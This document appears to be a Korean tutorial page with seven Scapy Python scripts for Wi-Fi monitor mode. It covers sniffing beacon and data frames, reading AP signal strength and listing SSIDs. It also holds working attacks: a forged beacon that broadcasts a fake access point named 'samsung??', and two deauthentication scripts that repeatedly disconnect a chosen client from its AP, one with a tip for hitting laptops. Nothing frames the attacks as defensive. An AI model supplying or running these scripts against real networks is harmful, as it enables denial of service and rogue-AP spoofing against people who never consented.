1. 무선 패킷 중에서 type이 0, subtype이 8 이면 AP가 브로드캐스트로 광고하는 패킷이며 이를 스니핑하겠다는 뜻.

from scapy.all import *
 
def packet_handler(pkt) :
    # if packet has 802.11 layer, and type of packet is Data frame
    if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:
            # do your stuff here
            print(pkt.show())
 
 
sniff(iface="wlan0mon", prn=packet_handler)


2. 무선 패킷 중에서 type이 2이면 데이터 패킷이며 이를 스니핑 하겠다는 뜻

from scapy.all import *
 
def packet_handler(pkt) :
    # if packet has 802.11 layer, and type of packet is Data frame
    if pkt.haslayer(Dot11) and pkt.type == 2:
            # do your stuff here
            print(pkt.show())
 
 
sniff(iface="wlan0mon", prn=packet_handler)


3. 무선 패킷 중에서 AP의 Signal Strength 세기를 확인하는 것

from scapy.all import *
 
def PacketHandler(pkt) :
  if pkt.haslayer(Dot11) :
    if pkt.type == 0 and pkt.subtype == 8 :
      if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        try:
            extra = pkt.notdecoded
            rssi = -(256-ord(extra[-4:-3]))
        except:
            rssi = -100
        print "WiFi signal strength:", rssi, "dBm of", pkt.addr2, pkt.info
 
sniff(iface="mon0", prn = PacketHandler)


4. 임의적으로 광고하는 AP를 만드는 패킷

from scapy.all import Dot11,Dot11Beacon,Dot11Elt,RadioTap,sendp,hexdump
 
netSSID = 'samsung??'       #Network name here
iface = 'wlan0mon'         #Interface name here
 
dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
addr2='33:33:33:33:33:33', addr3='33:33:33:33:33:33')
beacon = Dot11Beacon(cap=0411)
essid = Dot11Elt(ID='SSID',info=netSSID, len=len(netSSID))
rsn = Dot11Elt(ID='RSNinfo', info=(
'\x01\x00'                 #RSN Version 1
'\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
'\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
'\x00\x0f\xac\x04'         #AES Cipher
'\x00\x0f\xac\x02'         #TKIP Cipher
'\x01\x00'                 #1 Authentication Key Managment Suite (line below)
'\x00\x0f\xac\x02'         #Pre-Shared Key
'\x00\x00'))               #RSN Capabilities (no extra capabilities)
 
frame = RadioTap()/dot11/beacon/essid/rsn
 
frame.show()
print("\nHexdump of frame:")
hexdump(frame)
raw_input("\nPress enter to start\n")
 
sendp(frame, iface=iface, inter=0.100, loop=1)


5. 간단하게 AP의 MAC Address와 SSID를 출력하는 예제

from scapy.all import *
 
ap_list=[]
def packethandler(pkt):
    if pkt.haslayer(Dot11):
        if pkt.type == 0 and pkt.subtype == 8:
            if pkt.addr2 not in ap_list:
                ap_list.append(pkt.addr2)
                print "AP MAC: %s with SSID : %s " %(pkt.addr2, pkt.info)
sniff(iface="wlan0mon", prn=packethandler)


6. 간단하게 특정 Client을 끊는 Deauthentication 패킷 전송 예제1 (해당 AP의 채널로 설정해줘야함, #iwconfig wlan0mon channel <채널>) ※노트북을 대상으로 할시 inter을 0.0001로 하고 수행

from scapy.all import *
 
ap=""
client=""
pkt=RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
sendp(pkt, iface="wlan0mon",inter=0.100, loop=1)


7. 사용하기 편하게 수정한 Deauthentication 패킷 전송 예제2

import sys
if len(sys.argv) != 5:
    print 'Usage is ./scapy-deauth.py interface bssid client count'
    print 'Example - ./scapy-deauth.py mon0 00:11:22:33:44:55 55:44:33:22:11:00 50'
    sys.exit(1)
 
from scapy.all import *
 
conf.iface = sys.argv[1] # The interface that you want to send packets out of, needs to be set to monitor mode
bssid = sys.argv[2] # The BSSID of the Wireless Access Point you want to target
client = sys.argv[3] # The MAC address of the Client you want to kick off the Access Point
count = sys.argv[4] # The number of deauth packets you want to send
 
conf.verb = 0
 
packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
 
for n in range(int(count)):
    sendp(packet)
    print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + bssid + ' for Client: ' + client
